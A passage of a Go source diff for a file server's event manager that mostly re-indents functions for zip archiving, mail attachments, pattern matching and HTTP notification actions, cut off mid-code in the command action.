info.ModTime(),\n+                })\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"unable to create zip entry %q: %v\", entryPath, err)\n+                        return fmt.Errorf(\"unable to create zip entry %q: %w\", entryPath, err)\n+                }\n+                lister, err := conn.ListDir(entryPath)\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"unable to add zip entry %q, get dir lister error: %v\", entryPath, err)\n+                        return fmt.Errorf(\"unable to add zip entry %q: %w\", entryPath, err)\n+                }\n+                defer lister.Close()\n+\n+                for {\n+                        contents, err := lister.Next(vfs.ListerBatchSize)\n+                        finished := errors.Is(err, io.EOF)\n+                        if err := lister.convertError(err); err != nil {\n+                                eventManagerLog(logger.LevelError, \"unable to add zip entry %q, read dir error: %v\", entryPath, err)\n+                                return fmt.Errorf(\"unable to add zip entry %q: %w\", entryPath, err)\n+                        }\n+                        for _, info := range contents {\n+                                fullPath := util.CleanPath(path.Join(entryPath, info.Name()))\n+                                if err := addZipEntry(wr, conn, fullPath, baseDir, recursion); err != nil {\n+                                        eventManagerLog(logger.LevelError, \"unable to add zip entry: %v\", err)\n+                                        return err\n+                                }\n+                        }\n+                        if finished {\n+                                return nil\n+                        }\n+                }\n+        }\n+        if !info.Mode().IsRegular() {\n+                // we only allow regular files\n+                eventManagerLog(logger.LevelInfo, \"skipping zip entry for non regular file %q\", entryPath)\n+                return nil\n+        }\n+\n+        return addFileToZip(wr, conn, entryPath, entryName, info.ModTime())\n }\n \n func addFileToZip(wr *zipWriterWrapper, conn *BaseConnection, entryPath, entryName string, modTime time.Time) error {\n-\treader, cancelFn, err := getFileReader(conn, entryPath)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to add zip entry %q, cannot open file: %v\", entryPath, err)\n-\t\treturn fmt.Errorf(\"unable to open %q: %w\", entryPath, err)\n-\t}\n-\tdefer cancelFn()\n-\tdefer reader.Close()\n-\n-\tf, err := wr.Writer.CreateHeader(&zip.FileHeader{\n-\t\tName:     entryName,\n-\t\tMethod:   zip.Deflate,\n-\t\tModified: modTime,\n-\t})\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to create zip entry %q: %v\", entryPath, err)\n-\t\treturn fmt.Errorf(\"unable to create zip entry %q: %w\", entryPath, err)\n-\t}\n-\t_, err = io.Copy(f, reader)\n-\treturn err\n+        reader, cancelFn, err := getFileReader(conn, entryPath)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to add zip entry %q, cannot open file: %v\", entryPath, err)\n+                return fmt.Errorf(\"unable to open %q: %w\", entryPath, err)\n+        }\n+        defer cancelFn()\n+        defer reader.Close()\n+\n+        f, err := wr.Writer.CreateHeader(&zip.FileHeader{\n+                Name:     entryName,\n+                Method:   zip.Deflate,\n+                Modified: modTime,\n+        })\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to create zip entry %q: %v\", entryPath, err)\n+                return fmt.Errorf(\"unable to create zip entry %q: %w\", entryPath, err)\n+        }\n+        _, err = io.Copy(f, reader)\n+        return err\n }\n \n func getZipEntryName(entryPath, baseDir string) (string, error) {\n-\tif !strings.HasPrefix(entryPath, baseDir) {\n-\t\treturn \"\", fmt.Errorf(\"entry path %q is outside base dir %q\", entryPath, baseDir)\n-\t}\n-\tentryPath = strings.TrimPrefix(entryPath, baseDir)\n-\treturn strings.TrimPrefix(entryPath, \"/\"), nil\n+        if !strings.HasPrefix(entryPath, baseDir) {\n+                return \"\", fmt.Errorf(\"entry path %q is outside base dir %q\", entryPath, baseDir)\n+        }\n+        entryPath = strings.TrimPrefix(entryPath, baseDir)\n+        return strings.TrimPrefix(entryPath, \"/\"), nil\n }\n \n func getFileReader(conn *BaseConnection, virtualPath string) (io.ReadCloser, func(), error) {\n-\tif !conn.User.HasPerm(dataprovider.PermDownload, path.Dir(virtualPath)) {\n-\t\treturn nil, nil, conn.GetPermissionDeniedError()\n-\t}\n-\tfs, fsPath, err := conn.GetFsAndResolvedPath(virtualPath)\n-\tif err != nil {\n-\t\treturn nil, nil, err\n-\t}\n-\tf, r, cancelFn, err := fs.Open(fsPath, 0)\n-\tif err != nil {\n-\t\treturn nil, nil, conn.GetFsError(fs, err)\n-\t}\n-\tif cancelFn == nil {\n-\t\tcancelFn = func() {}\n-\t}\n-\n-\tif f != nil {\n-\t\treturn f, cancelFn, nil\n-\t}\n-\treturn r, cancelFn, nil\n+        if !conn.User.HasPerm(dataprovider.PermDownload, path.Dir(virtualPath)) {\n+                return nil, nil, conn.GetPermissionDeniedError()\n+        }\n+        fs, fsPath, err := conn.GetFsAndResolvedPath(virtualPath)\n+        if err != nil {\n+                return nil, nil, err\n+        }\n+        f, r, cancelFn, err := fs.Open(fsPath, 0)\n+        if err != nil {\n+                return nil, nil, conn.GetFsError(fs, err)\n+        }\n+        if cancelFn == nil {\n+                cancelFn = func() {}\n+        }\n+\n+        if f != nil {\n+                return f, cancelFn, nil\n+        }\n+        return r, cancelFn, nil\n }\n \n func writeFileContent(conn *BaseConnection, virtualPath string, w io.Writer) error {\n-\treader, cancelFn, err := getFileReader(conn, virtualPath)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        reader, cancelFn, err := getFileReader(conn, virtualPath)\n+        if err != nil {\n+                return err\n+        }\n \n-\tdefer cancelFn()\n-\tdefer reader.Close()\n+        defer cancelFn()\n+        defer reader.Close()\n \n-\t_, err = io.Copy(w, reader)\n-\treturn err\n+        _, err = io.Copy(w, reader)\n+        return err\n }\n \n func getFileContentFn(conn *BaseConnection, virtualPath string, size int64) func(w io.Writer) (int64, error) {\n-\treturn func(w io.Writer) (int64, error) {\n-\t\treader, cancelFn, err := getFileReader(conn, virtualPath)\n-\t\tif err != nil {\n-\t\t\treturn 0, err\n-\t\t}\n+        return func(w io.Writer) (int64, error) {\n+                reader, cancelFn, err := getFileReader(conn, virtualPath)\n+                if err != nil {\n+                        return 0, err\n+                }\n \n-\t\tdefer cancelFn()\n-\t\tdefer reader.Close()\n+                defer cancelFn()\n+                defer reader.Close()\n \n-\t\treturn io.CopyN(w, reader, size)\n-\t}\n+                return io.CopyN(w, reader, size)\n+        }\n }\n \n func getMailAttachments(conn *BaseConnection, attachments []string, replacer *strings.Replacer) ([]*mail.File, error) {\n-\tvar files []*mail.File\n-\ttotalSize := int64(0)\n-\n-\tfor _, virtualPath := range replacePathsPlaceholders(attachments, replacer) {\n-\t\tinfo, err := conn.DoStat(virtualPath, 0, false)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"unable to get info for file %q, user %q: %w\", virtualPath, conn.User.Username, err)\n-\t\t}\n-\t\tif !info.Mode().IsRegular() {\n-\t\t\treturn nil, fmt.Errorf(\"cannot attach non regular file %q\", virtualPath)\n-\t\t}\n-\t\ttotalSize += info.Size()\n-\t\tif totalSize > maxAttachmentsSize {\n-\t\t\treturn nil, fmt.Errorf(\"unable to send files as attachment, size too large: %s\", util.ByteCountIEC(totalSize))\n-\t\t}\n-\t\tfiles = append(files, &mail.File{\n-\t\t\tName:   path.Base(virtualPath),\n-\t\t\tHeader: make(map[string][]string),\n-\t\t\tWriter: getFileContentFn(conn, virtualPath, info.Size()),\n-\t\t})\n-\t}\n-\treturn files, nil\n+        var files []*mail.File\n+        totalSize := int64(0)\n+\n+        for _, virtualPath := range replacePathsPlaceholders(attachments, replacer) {\n+                info, err := conn.DoStat(virtualPath, 0, false)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"unable to get info for file %q, user %q: %w\", virtualPath, conn.User.Username, err)\n+                }\n+                if !info.Mode().IsRegular() {\n+                        return nil, fmt.Errorf(\"cannot attach non regular file %q\", virtualPath)\n+                }\n+                totalSize += info.Size()\n+                if totalSize > maxAttachmentsSize {\n+                        return nil, fmt.Errorf(\"unable to send files as attachment, size too large: %s\", util.ByteCountIEC(totalSize))\n+                }\n+                files = append(files, &mail.File{\n+                        Name:   path.Base(virtualPath),\n+                        Header: make(map[string][]string),\n+                        Writer: getFileContentFn(conn, virtualPath, info.Size()),\n+                })\n+        }\n+        return files, nil\n }\n \n func replaceWithReplacer(input string, replacer *strings.Replacer) string {\n-\tif !strings.Contains(input, \"{{\") {\n-\t\treturn input\n-\t}\n-\treturn replacer.Replace(input)\n+        if !strings.Contains(input, \"{{\") {\n+                return input\n+        }\n+        return replacer.Replace(input)\n }\n \n func checkEventConditionPattern(p dataprovider.ConditionPattern, name string) bool {\n-\tvar matched bool\n-\tvar err error\n-\tif strings.Contains(p.Pattern, \"**\") {\n-\t\tmatched, err = doublestar.Match(p.Pattern, name)\n-\t} else {\n-\t\tmatched, err = path.Match(p.Pattern, name)\n-\t}\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"pattern matching error %q, err: %v\", p.Pattern, err)\n-\t\treturn false\n-\t}\n-\tif p.InverseMatch {\n-\t\treturn !matched\n-\t}\n-\treturn matched\n+        var matched bool\n+        var err error\n+        if strings.Contains(p.Pattern, \"**\") {\n+                matched, err = doublestar.Match(p.Pattern, name)\n+        } else {\n+                matched, err = path.Match(p.Pattern, name)\n+        }\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"pattern matching error %q, err: %v\", p.Pattern, err)\n+                return false\n+        }\n+        if p.InverseMatch {\n+                return !matched\n+        }\n+        return matched\n }\n \n func checkUserConditionOptions(user *dataprovider.User, conditions *dataprovider.ConditionOptions) bool {\n-\tif !checkEventConditionPatterns(user.Username, conditions.Names) {\n-\t\treturn false\n-\t}\n-\tif !checkEventConditionPatterns(user.Role, conditions.RoleNames) {\n-\t\treturn false\n-\t}\n-\tif !checkEventGroupConditionPatterns(user.Groups, conditions.GroupNames) {\n-\t\treturn false\n-\t}\n-\treturn true\n+        if !checkEventConditionPatterns(user.Username, conditions.Names) {\n+                return false\n+        }\n+        if !checkEventConditionPatterns(user.Role, conditions.RoleNames) {\n+                return false\n+        }\n+        if !checkEventGroupConditionPatterns(user.Groups, conditions.GroupNames) {\n+                return false\n+        }\n+        return true\n }\n \n // checkEventConditionPatterns returns false if patterns are defined and no match is found\n func checkEventConditionPatterns(name string, patterns []dataprovider.ConditionPattern) bool {\n-\tif len(patterns) == 0 {\n-\t\treturn true\n-\t}\n-\tmatches := false\n-\tfor _, p := range patterns {\n-\t\t// assume, that multiple InverseMatches are set\n-\t\tif p.InverseMatch {\n-\t\t\tif checkEventConditionPattern(p, name) {\n-\t\t\t\tmatches = true\n-\t\t\t} else {\n-\t\t\t\treturn false\n-\t\t\t}\n-\t\t} else if checkEventConditionPattern(p, name) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn matches\n+        if len(patterns) == 0 {\n+                return true\n+        }\n+        matches := false\n+        for _, p := range patterns {\n+                // assume, that multiple InverseMatches are set\n+                if p.InverseMatch {\n+                        if checkEventConditionPattern(p, name) {\n+                                matches = true\n+                        } else {\n+                                return false\n+                        }\n+                } else if checkEventConditionPattern(p, name) {\n+                        return true\n+                }\n+        }\n+        return matches\n }\n \n func checkEventGroupConditionPatterns(groups []sdk.GroupMapping, patterns []dataprovider.ConditionPattern) bool {\n-\tif len(patterns) == 0 {\n-\t\treturn true\n-\t}\n-\tmatches := false\n-\tfor _, group := range groups {\n-\t\tfor _, p := range patterns {\n-\t\t\t// assume, that multiple InverseMatches are set\n-\t\t\tif p.InverseMatch {\n-\t\t\t\tif checkEventConditionPattern(p, group.Name) {\n-\t\t\t\t\tmatches = true\n-\t\t\t\t} else {\n-\t\t\t\t\treturn false\n-\t\t\t\t}\n-\t\t\t} else {\n-\t\t\t\tif checkEventConditionPattern(p, group.Name) {\n-\t\t\t\t\treturn true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn matches\n+        if len(patterns) == 0 {\n+                return true\n+        }\n+        matches := false\n+        for _, group := range groups {\n+                for _, p := range patterns {\n+                        // assume, that multiple InverseMatches are set\n+                        if p.InverseMatch {\n+                                if checkEventConditionPattern(p, group.Name) {\n+                                        matches = true\n+                                } else {\n+                                        return false\n+                                }\n+                        } else {\n+                                if checkEventConditionPattern(p, group.Name) {\n+                                        return true\n+                                }\n+                        }\n+                }\n+        }\n+        return matches\n }\n \n func getHTTPRuleActionEndpoint(c *dataprovider.EventActionHTTPConfig, replacer *strings.Replacer) (string, error) {\n-\tu, err := url.Parse(c.Endpoint)\n-\tif err != nil {\n-\t\treturn \"\", fmt.Errorf(\"invalid endpoint: %w\", err)\n-\t}\n-\tif strings.Contains(u.Path, \"{{\") {\n-\t\tpathComponents := strings.Split(u.Path, \"/\")\n-\t\tfor idx := range pathComponents {\n-\t\t\tpart := replaceWithReplacer(pathComponents[idx], replacer)\n-\t\t\tif part != pathComponents[idx] {\n-\t\t\t\tpathComponents[idx] = url.PathEscape(part)\n-\t\t\t}\n-\t\t}\n-\t\tu.Path = \"\"\n-\t\tu = u.JoinPath(pathComponents...)\n-\t}\n-\tif len(c.QueryParameters) > 0 {\n-\t\tq := u.Query()\n-\n-\t\tfor _, keyVal := range c.QueryParameters {\n-\t\t\tq.Add(keyVal.Key, replaceWithReplacer(keyVal.Value, replacer))\n-\t\t}\n-\n-\t\tu.RawQuery = q.Encode()\n-\t}\n-\treturn u.String(), nil\n+        u, err := url.Parse(c.Endpoint)\n+        if err != nil {\n+                return \"\", fmt.Errorf(\"invalid endpoint: %w\", err)\n+        }\n+        if strings.Contains(u.Path, \"{{\") {\n+                pathComponents := strings.Split(u.Path, \"/\")\n+                for idx := range pathComponents {\n+                        part := replaceWithReplacer(pathComponents[idx], replacer)\n+                        if part != pathComponents[idx] {\n+                                pathComponents[idx] = url.PathEscape(part)\n+                        }\n+                }\n+                u.Path = \"\"\n+                u = u.JoinPath(pathComponents...)\n+        }\n+        if len(c.QueryParameters) > 0 {\n+                q := u.Query()\n+\n+                for _, keyVal := range c.QueryParameters {\n+                        q.Add(keyVal.Key, replaceWithReplacer(keyVal.Value, replacer))\n+                }\n+\n+                u.RawQuery = q.Encode()\n+        }\n+        return u.String(), nil\n }\n \n func writeHTTPPart(m *multipart.Writer, part dataprovider.HTTPPart, h textproto.MIMEHeader,\n-\tconn *BaseConnection, replacer *strings.Replacer, params *EventParams, addObjectData bool,\n+        conn *BaseConnection, replacer *strings.Replacer, params *EventParams, addObjectData bool,\n ) error {\n-\tpartWriter, err := m.CreatePart(h)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to create part %q, err: %v\", part.Name, err)\n-\t\treturn err\n-\t}\n-\tif part.Body != \"\" {\n-\t\tcType := h.Get(\"Content-Type\")\n-\t\tif strings.Contains(strings.ToLower(cType), \"application/json\") {\n-\t\t\treplacements := params.getStringReplacements(addObjectData, true)\n-\t\t\tjsonReplacer := strings.NewReplacer(replacements...)\n-\t\t\t_, err = partWriter.Write(util.StringToBytes(replaceWithReplacer(part.Body, jsonReplacer)))\n-\t\t} else {\n-\t\t\t_, err = partWriter.Write(util.StringToBytes(replaceWithReplacer(part.Body, replacer)))\n-\t\t}\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"unable to write part %q, err: %v\", part.Name, err)\n-\t\t\treturn err\n-\t\t}\n-\t\treturn nil\n-\t}\n-\tif part.Filepath == dataprovider.RetentionReportPlaceHolder {\n-\t\tdata, err := params.getCompressedDataRetentionReport()\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\t_, err = partWriter.Write(data)\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"unable to write part %q, err: %v\", part.Name, err)\n-\t\t\treturn err\n-\t\t}\n-\t\treturn nil\n-\t}\n-\terr = writeFileContent(conn, util.CleanPath(replacer.Replace(part.Filepath)), partWriter)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to write file part %q, err: %v\", part.Name, err)\n-\t\treturn err\n-\t}\n-\treturn nil\n+        partWriter, err := m.CreatePart(h)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to create part %q, err: %v\", part.Name, err)\n+                return err\n+        }\n+        if part.Body != \"\" {\n+                cType := h.Get(\"Content-Type\")\n+                if strings.Contains(strings.ToLower(cType), \"application/json\") {\n+                        replacements := params.getStringReplacements(addObjectData, true)\n+                        jsonReplacer := strings.NewReplacer(replacements...)\n+                        _, err = partWriter.Write(util.StringToBytes(replaceWithReplacer(part.Body, jsonReplacer)))\n+                } else {\n+                        _, err = partWriter.Write(util.StringToBytes(replaceWithReplacer(part.Body, replacer)))\n+                }\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"unable to write part %q, err: %v\", part.Name, err)\n+                        return err\n+                }\n+                return nil\n+        }\n+        if part.Filepath == dataprovider.RetentionReportPlaceHolder {\n+                data, err := params.getCompressedDataRetentionReport()\n+                if err != nil {\n+                        return err\n+                }\n+                _, err = partWriter.Write(data)\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"unable to write part %q, err: %v\", part.Name, err)\n+                        return err\n+                }\n+                return nil\n+        }\n+        err = writeFileContent(conn, util.CleanPath(replacer.Replace(part.Filepath)), partWriter)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to write file part %q, err: %v\", part.Name, err)\n+                return err\n+        }\n+        return nil\n }\n \n func getHTTPRuleActionBody(c *dataprovider.EventActionHTTPConfig, replacer *strings.Replacer,\n-\tcancel context.CancelFunc, user dataprovider.User, params *EventParams, addObjectData bool,\n+        cancel context.CancelFunc, user dataprovider.User, params *EventParams, addObjectData bool,\n ) (io.Reader, string, error) {\n-\tvar body io.Reader\n-\tif c.Method == http.MethodGet {\n-\t\treturn body, \"\", nil\n-\t}\n-\tif c.Body != \"\" {\n-\t\tif c.Body == dataprovider.RetentionReportPlaceHolder {\n-\t\t\tdata, err := params.getCompressedDataRetentionReport()\n-\t\t\tif err != nil {\n-\t\t\t\treturn body, \"\", err\n-\t\t\t}\n-\t\t\treturn bytes.NewBuffer(data), \"\", nil\n-\t\t}\n-\t\tif c.HasJSONBody() {\n-\t\t\treplacements := params.getStringReplacements(addObjectData, true)\n-\t\t\tjsonReplacer := strings.NewReplacer(replacements...)\n-\t\t\treturn bytes.NewBufferString(replaceWithReplacer(c.Body, jsonReplacer)), \"\", nil\n-\t\t}\n-\t\treturn bytes.NewBufferString(replaceWithReplacer(c.Body, replacer)), \"\", nil\n-\t}\n-\tif len(c.Parts) > 0 {\n-\t\tr, w := io.Pipe()\n-\t\tm := multipart.NewWriter(w)\n-\n-\t\tvar conn *BaseConnection\n-\t\tif user.Username != \"\" {\n-\t\t\tvar err error\n-\t\t\tuser, err = getUserForEventAction(user)\n-\t\t\tif err != nil {\n-\t\t\t\treturn body, \"\", err\n-\t\t\t}\n-\t\t\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\t\t\terr = user.CheckFsRoot(connectionID)\n-\t\t\tif err != nil {\n-\t\t\t\tuser.CloseFs() //nolint:errcheck\n-\t\t\t\treturn body, \"\", fmt.Errorf(\"error getting multipart file/s, unable to check root fs for user %q: %w\",\n-\t\t\t\t\tuser.Username, err)\n-\t\t\t}\n-\t\t\tconn = NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\t\t}\n-\n-\t\tgo func() {\n-\t\t\tdefer w.Close()\n-\t\t\tdefer user.CloseFs() //nolint:errcheck\n-\n-\t\t\tfor _, part := range c.Parts {\n-\t\t\t\th := make(textproto.MIMEHeader)\n-\t\t\t\tif part.Body != \"\" {\n-\t\t\t\t\th.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"`, multipartQuoteEscaper.Replace(part.Name)))\n-\t\t\t\t} else {\n-\t\t\t\t\th.Set(\"Content-Disposition\",\n-\t\t\t\t\t\tfmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`,\n-\t\t\t\t\t\t\tmultipartQuoteEscaper.Replace(part.Name),\n-\t\t\t\t\t\t\tmultipartQuoteEscaper.Replace((path.Base(replaceWithReplacer(part.Filepath, replacer))))))\n-\t\t\t\t\tcontentType := mime.TypeByExtension(path.Ext(part.Filepath))\n-\t\t\t\t\tif contentType == \"\" {\n-\t\t\t\t\t\tcontentType = \"application/octet-stream\"\n-\t\t\t\t\t}\n-\t\t\t\t\th.Set(\"Content-Type\", contentType)\n-\t\t\t\t}\n-\t\t\t\tfor _, keyVal := range part.Headers {\n-\t\t\t\t\th.Set(keyVal.Key, replaceWithReplacer(keyVal.Value, replacer))\n-\t\t\t\t}\n-\t\t\t\tif err := writeHTTPPart(m, part, h, conn, replacer, params, addObjectData); err != nil {\n-\t\t\t\t\tcancel()\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tm.Close()\n-\t\t}()\n-\n-\t\treturn r, m.FormDataContentType(), nil\n-\t}\n-\treturn body, \"\", nil\n+        var body io.Reader\n+        if c.Method == http.MethodGet {\n+                return body, \"\", nil\n+        }\n+        if c.Body != \"\" {\n+                if c.Body == dataprovider.RetentionReportPlaceHolder {\n+                        data, err := params.getCompressedDataRetentionReport()\n+                        if err != nil {\n+                                return body, \"\", err\n+                        }\n+                        return bytes.NewBuffer(data), \"\", nil\n+                }\n+                if c.HasJSONBody() {\n+                        replacements := params.getStringReplacements(addObjectData, true)\n+                        jsonReplacer := strings.NewReplacer(replacements...)\n+                        return bytes.NewBufferString(replaceWithReplacer(c.Body, jsonReplacer)), \"\", nil\n+                }\n+                return bytes.NewBufferString(replaceWithReplacer(c.Body, replacer)), \"\", nil\n+        }\n+        if len(c.Parts) > 0 {\n+                r, w := io.Pipe()\n+                m := multipart.NewWriter(w)\n+\n+                var conn *BaseConnection\n+                if user.Username != \"\" {\n+                        var err error\n+                        user, err = getUserForEventAction(user)\n+                        if err != nil {\n+                                return body, \"\", err\n+                        }\n+                        connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+                        err = user.CheckFsRoot(connectionID)\n+                        if err != nil {\n+                                user.CloseFs() //nolint:errcheck\n+                                return body, \"\", fmt.Errorf(\"error getting multipart file/s, unable to check root fs for user %q: %w\",\n+                                        user.Username, err)\n+                        }\n+                        conn = NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+                }\n+\n+                go func() {\n+                        defer w.Close()\n+                        defer user.CloseFs() //nolint:errcheck\n+\n+                        for _, part := range c.Parts {\n+                                h := make(textproto.MIMEHeader)\n+                                if part.Body != \"\" {\n+                                        h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"`, multipartQuoteEscaper.Replace(part.Name)))\n+                                } else {\n+                                        h.Set(\"Content-Disposition\",\n+                                                fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`,\n+                                                        multipartQuoteEscaper.Replace(part.Name),\n+                                                        multipartQuoteEscaper.Replace((path.Base(replaceWithReplacer(part.Filepath, replacer))))))\n+                                        contentType := mime.TypeByExtension(path.Ext(part.Filepath))\n+                                        if contentType == \"\" {\n+                                                contentType = \"application/octet-stream\"\n+                                        }\n+                                        h.Set(\"Content-Type\", contentType)\n+                                }\n+                                for _, keyVal := range part.Headers {\n+                                        h.Set(keyVal.Key, replaceWithReplacer(keyVal.Value, replacer))\n+                                }\n+                                if err := writeHTTPPart(m, part, h, conn, replacer, params, addObjectData); err != nil {\n+                                        cancel()\n+                                        return\n+                                }\n+                        }\n+                        m.Close()\n+                }()\n+\n+                return r, m.FormDataContentType(), nil\n+        }\n+        return body, \"\", nil\n }\n \n func setHTTPReqHeaders(req *http.Request, c *dataprovider.EventActionHTTPConfig, replacer *strings.Replacer,\n-\tcontentType string,\n+        contentType string,\n ) {\n-\tif contentType != \"\" {\n-\t\treq.Header.Set(\"Content-Type\", contentType)\n-\t}\n-\tif c.Username != \"\" || c.Password.GetPayload() != \"\" {\n-\t\treq.SetBasicAuth(replaceWithReplacer(c.Username, replacer), c.Password.GetPayload())\n-\t}\n-\tfor _, keyVal := range c.Headers {\n-\t\treq.Header.Set(keyVal.Key, replaceWithReplacer(keyVal.Value, replacer))\n-\t}\n+        if contentType != \"\" {\n+                req.Header.Set(\"Content-Type\", contentType)\n+        }\n+        if c.Username != \"\" || c.Password.GetPayload() != \"\" {\n+                req.SetBasicAuth(replaceWithReplacer(c.Username, replacer), c.Password.GetPayload())\n+        }\n+        for _, keyVal := range c.Headers {\n+                req.Header.Set(keyVal.Key, replaceWithReplacer(keyVal.Value, replacer))\n+        }\n }\n \n func executeHTTPRuleAction(c dataprovider.EventActionHTTPConfig, params *EventParams) error {\n-\tif err := c.TryDecryptPassword(); err != nil {\n-\t\treturn err\n-\t}\n-\taddObjectData := false\n-\tif params.Object != nil {\n-\t\taddObjectData = c.HasObjectData()\n-\t}\n-\n-\treplacements := params.getStringReplacements(addObjectData, false)\n-\treplacer := strings.NewReplacer(replacements...)\n-\tendpoint, err := getHTTPRuleActionEndpoint(&c, replacer)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tctx, cancel := c.GetContext()\n-\tdefer cancel()\n-\n-\tvar user dataprovider.User\n-\tif c.HasMultipartFiles() {\n-\t\tuser, err = params.getUserFromSender()\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\tbody, contentType, err := getHTTPRuleActionBody(&c, replacer, cancel, user, params, addObjectData)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tif body != nil {\n-\t\trc, ok := body.(io.ReadCloser)\n-\t\tif ok {\n-\t\t\tdefer rc.Close()\n-\t\t}\n-\t}\n-\treq, err := http.NewRequestWithContext(ctx, c.Method, endpoint, body)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tsetHTTPReqHeaders(req, &c, replacer, contentType)\n-\n-\tclient := c.GetHTTPClient()\n-\tdefer client.CloseIdleConnections()\n-\n-\tstartTime := time.Now()\n-\tresp, err := client.Do(req)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelDebug, \"unable to send http notification, endpoint: %s, elapsed: %s, err: %v\",\n-\t\t\tendpoint, time.Since(startTime), err)\n-\t\treturn fmt.Errorf(\"error sending HTTP request: %w\", err)\n-\t}\n-\tdefer resp.Body.Close()\n-\n-\teventManagerLog(logger.LevelDebug, \"http notification sent, endpoint: %s, elapsed: %s, status code: %d\",\n-\t\tendpoint, time.Since(startTime), resp.StatusCode)\n-\tif resp.StatusCode < http.StatusOK || resp.StatusCode > http.StatusNoContent {\n-\t\tif rb, err := io.ReadAll(io.LimitReader(resp.Body, 2048)); err == nil {\n-\t\t\teventManagerLog(logger.LevelDebug, \"error notification response from endpoint %q: %s\",\n-\t\t\t\tendpoint, util.BytesToString(rb))\n-\t\t}\n-\t\treturn fmt.Errorf(\"unexpected status code: %d\", resp.StatusCode)\n-\t}\n-\n-\treturn nil\n+        if err := c.TryDecryptPassword(); err != nil {\n+                return err\n+        }\n+        addObjectData := false\n+        if params.Object != nil {\n+                addObjectData = c.HasObjectData()\n+        }\n+\n+        replacements := params.getStringReplacements(addObjectData, false)\n+        replacer := strings.NewReplacer(replacements...)\n+        endpoint, err := getHTTPRuleActionEndpoint(&c, replacer)\n+        if err != nil {\n+                return err\n+        }\n+\n+        ctx, cancel := c.GetContext()\n+        defer cancel()\n+\n+        var user dataprovider.User\n+        if c.HasMultipartFiles() {\n+                user, err = params.getUserFromSender()\n+                if err != nil {\n+                        return err\n+                }\n+        }\n+        body, contentType, err := getHTTPRuleActionBody(&c, replacer, cancel, user, params, addObjectData)\n+        if err != nil {\n+                return err\n+        }\n+        if body != nil {\n+                rc, ok := body.(io.ReadCloser)\n+                if ok {\n+                        defer rc.Close()\n+                }\n+        }\n+        req, err := http.NewRequestWithContext(ctx, c.Method, endpoint, body)\n+        if err != nil {\n+                return err\n+        }\n+        setHTTPReqHeaders(req, &c, replacer, contentType)\n+\n+        client := c.GetHTTPClient()\n+        defer client.CloseIdleConnections()\n+\n+        startTime := time.Now()\n+        resp, err := client.Do(req)\n+        if err != nil {\n+                eventManagerLog(logger.LevelDebug, \"unable to send http notification, endpoint: %s, elapsed: %s, err: %v\",\n+                        endpoint, time.Since(startTime), err)\n+                return fmt.Errorf(\"error sending HTTP request: %w\", err)\n+        }\n+        defer resp.Body.Close()\n+\n+        eventManagerLog(logger.LevelDebug, \"http notification sent, endpoint: %s, elapsed: %s, status code: %d\",\n+                endpoint, time.Since(startTime), resp.StatusCode)\n+        if resp.StatusCode < http.StatusOK || resp.StatusCode > http.StatusNoContent {\n+                if rb, err := io.ReadAll(io.LimitReader(resp.Body, 2048)); err == nil {\n+                        eventManagerLog(logger.LevelDebug, \"error notification response from endpoint %q: %s\",\n+                                endpoint, util.BytesToString(rb))\n+                }\n+                return fmt.Errorf(\"unexpected status code: %d\", resp.StatusCode)\n+        }\n+\n+        return nil\n }\n \n func executeCommandRuleAction(c dataprovider.EventActionCommandConfig, params *EventParams) error {\n-\taddObjectData := false\n-\tif params.Object != nil {\n-\t\tfor _, k := range c.EnvVars {\n-\t\t\tif strings.Contains(k.Value, objDataPlaceholder) || strings.Contains(k.Value, objDataPlaceholderString) {\n-\t\t\t\taddObjectData = true\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\t}\n-\treplacements := params.getStringReplacements(addObjectData, false)\n-\treplacer := strings.NewReplacer(replacements...)\n-\n-\targs := make([]string, 0, len(c.Args))\n-\tfor _, arg := range c.Args {\n-\t\targs = append(args, replaceWithReplacer(arg, replacer))\n-\t}\n-\n-\tctx, cancel := context.WithTimeout(context.Background(), time.Duration(c.Timeout)*time.Second)\n-\tdefer cancel()\n-\n-\tcmd := exec.CommandContext(ctx, c.Cmd, args...)\n-\tcmd.Env = []string{}\n-\tfor _, keyVal := range c.EnvVars {\n-\t\tif keyVal.Value == \"$\" {\n-\t\t\tval := 